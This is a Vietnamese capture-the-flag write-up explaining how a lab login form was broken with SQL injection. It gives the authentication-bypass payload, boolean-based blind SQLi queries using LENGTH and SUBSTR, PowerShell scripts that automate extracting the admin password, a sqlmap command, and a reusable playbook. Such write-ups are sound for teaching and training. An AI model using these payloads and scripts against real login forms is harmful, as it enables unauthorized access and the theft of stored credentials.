# login-blind-sqli

- **Category:** Web (Boolean-based Blind SQLi)
- **File đề:** Đề online, không có file kèm. Mục tiêu: `http://target1` (script ví dụ dùng `http://10.0.10.30/index.php`). *(Chú thích: PDF gốc tham chiếu tên nền tảng/giải — lược bỏ theo quy tắc trung tính.)*

## Tóm tắt đề
Web server có một form đăng nhập. Nhiệm vụ: chiếm flag. Gợi ý: "các kỹ thuật tấn công điển hình". Flag chính là **mật khẩu của admin**, có định dạng `flag{*-SQL-*}`.

## Phân tích (chi tiết: hằng số/offset/payload/khóa thật)
Form login dính **SQL Injection**. Payload bypass xác thực kinh điển:
```sql
' or 1=1 limit 1;#
```
Khi bypass thành công, trang hiện: *"Conguraturations! you have bypassed the authentication."* — chuỗi này chính là **oracle TRUE/FALSE** để làm blind.

Vì không có kênh hiển thị dữ liệu trực tiếp, ta dùng **Boolean-based Blind SQLi**: nhét một điều kiện phụ vào payload; điều kiện đúng → login thành công (hiện chuỗi chúc mừng), sai → thất bại. Quan sát sự xuất hiện của chuỗi oracle để suy ra từng ký tự mật khẩu.

Dữ kiện load-bearing:
- **Độ dài mật khẩu admin = 29 ký tự** (tìm bằng `LENGTH()`).
- Cấu trúc đã biết: `flag{` (5) + `*` + `-SQL-` (5) + `*` + `}` (1) → chỉ cần brute 2 đoạn `*`.
- Charset của `*`: chữ-số (`a-zA-Z0-9`), không ký hiệu đặc biệt.
- Comment MySQL dùng `#` (hoặc `-- ` có dấu cách); `limit 1` để tránh nhiều dòng phá query.

## Kỹ thuật áp dụng (+ VÌ SAO nhận ra)
- **Authentication bypass qua SQLi:** `' or 1=1 limit 1;#`.
- **Boolean-based Blind SQLi:** `LENGTH()` tìm độ dài, `SUBSTR()` so từng ký tự.
- **VÌ SAO nhận ra:** form login + `' or 1=1` cho qua → khẳng định SQLi. Không có kênh trả dữ liệu → boolean-blind dựa trên chuỗi oracle "Conguraturations...".
- **Công cụ:** PowerShell `Invoke-WebRequest` (script dưới), hoặc Python `requests`, hoặc `sqlmap --technique=B`.

## Lời giải chi tiết (bước + code/lệnh/payload sạch, chạy lại được)
1. **Xác nhận SQLi** — nhập vào username:
   ```sql
   ' or 1=1 limit 1;#
   ```
   → hiện "Conguraturations! you have bypassed the authentication."

2. **Tìm độ dài mật khẩu** (tăng dần tới khi login thất bại):
   ```sql
   ' or (SELECT LENGTH(password) FROM users WHERE username='admin') > N limit 1;#
   ```
   Tự động hóa (PowerShell):
   ```powershell
   $targetUrl = "http://10.0.10.30/index.php"
   function Test-Payload($payload) {
       $body = "username=" + [uri]::EscapeDataString($payload) + "&password=x"
       $r = Invoke-WebRequest -Uri $targetUrl -Method POST -Body $body `
             -ContentType "application/x-www-form-urlencoded" -SessionVariable s
       return $r.Content.Contains("Conguraturations! you have bypassed the authentication.")
   }
   $len = 1
   while ($len -lt 100) {
       $p = "' or (select length(password) from users where username='admin') > $len limit 1;#"
       if (Test-Payload $p) { $len++ } else { break }
   }
   "Password length = $len"       # -> 29
   ```

3. **Trích từng ký tự** bằng `SUBSTR` (charset chữ-số). Tận dụng cấu trúc `flag{*-SQL-*}`: brute đoạn `*` thứ nhất từ vị trí 6 tới khi gặp `-`, rồi tính độ dài đoạn `*` thứ hai = `29 - (5 + len_front + 5 + 1)`:
   ```powershell
   $charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
   function Find-Char($pos) {
       foreach ($c in $charset.ToCharArray()) {
           $p = "' or SUBSTR((SELECT password FROM users WHERE username='admin'),$pos,1)='$c' limit 1;#"
           if (Test-Payload $p) { return $c }
       }
       return $null
   }
   # Ví dụ kiểm tra ký tự đầu là 'C':
   #   ' or SUBSTR((SELECT password FROM users WHERE username='admin'),1,1)='C' limit 1;#
   ```
   Tối ưu: dùng `ASCII()` + **binary search** (so `>`/`<`) để giảm số request từ ~62 xuống ~7/ký tự.

4. **Ghép lại:** `flag{` + đoạn `*` đầu + `-SQL-` + đoạn `*` sau + `}` = mật khẩu admin = flag.

## Flag
flag{...-SQL-...}

*(Nguồn canonical `SOLUTIONS_VN.md` — bài #36: flag dạng `flag{*-SQL-*}`, lấy qua blind SQLi; nội dung đầy đủ của `*` **nguồn không nêu** — chỉ xác định được khi chạy blind trên server thật. Flag thật có wrapper `flag{...-SQL-...}`.)*

## Gặp lại thì xử lý thế nào (playbook)
- **Dấu hiệu nhận diện SQLi:** form login/tham số; thử `'`, `"`, `' or 1=1-- -`, `' or 1=1 limit 1;#`. Response đổi (login qua / lỗi SQL / số dòng đổi) → SQLi.
- **Khi không thấy dữ liệu (blind):** chuyển boolean-based — chọn oracle phân biệt TRUE/FALSE (ở đây chuỗi "Conguraturations..."). `LENGTH()` tìm độ dài, `SUBSTR()`/`ASCII()` so ký tự. Tối ưu **binary search trên ASCII**.
- **Tận dụng cấu trúc flag:** biết prefix/infix/suffix (`flag{`, `-SQL-`, `}`) → chỉ brute phần biến thiên.
- **Công cụ:** script tự viết (PowerShell/Python) hoặc `sqlmap -u ... --data "username=*&password=x" --technique=B --dump` (cú pháp `limit 1;#` gợi ý MySQL).
- **Bẫy:** comment `#` vs `-- ` (có dấu cách); `limit 1`; URL-encode payload; collation có thể làm `'c'='C'` (kiểm tra kỹ phân biệt hoa/thường); rate-limit/khóa tài khoản.
- **Checklist:** [ ] xác nhận SQLi [ ] chọn oracle TRUE/FALSE [ ] `LENGTH` tìm độ dài [ ] `SUBSTR` trích ký tự (binary search) [ ] dùng cấu trúc flag [ ] ghép mật khẩu.
